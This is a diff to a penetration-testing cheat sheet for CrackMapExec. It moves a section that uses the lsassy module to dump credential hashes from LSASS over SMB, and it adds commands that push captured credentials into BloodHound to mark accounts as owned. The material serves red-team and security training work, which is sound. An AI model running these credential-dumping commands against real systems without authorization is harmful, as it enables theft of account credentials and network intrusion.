@@ -243,12 +243,6 @@ creds
 cme smb <ip> --id 5
 ```
 
-#### Use the lsassy module
-```
-cme smb -m lsassy –options
-procdump_path can automate dumping hashes with procpdump
-```
-
 #### Use the gpp_autologin to check for auto login credentials
 ```
 cme smb -m gpp_autologin –options
@@ -258,3 +252,21 @@ cme smb -m gpp_autologin –options
 ```
 | tee -a cme.log
 ```
+
+#### Use the lsassy module
+```
+cme smb -m lsassy –options
+procdump_path can automate dumping hashes with procpdump
+```
+
+#### Send credentials to BloodHound to set them owned
+```
+cme smb <ip> -u <username> -p <password> -M bh_owned -o PASS=<bloodhound_password>
+```
+
+#### Send LSASSY credentials to BloodHound to set them owned
+```
+cme smb 127.0.0.1 -M lsassy --bloodhound 
+```
+
+
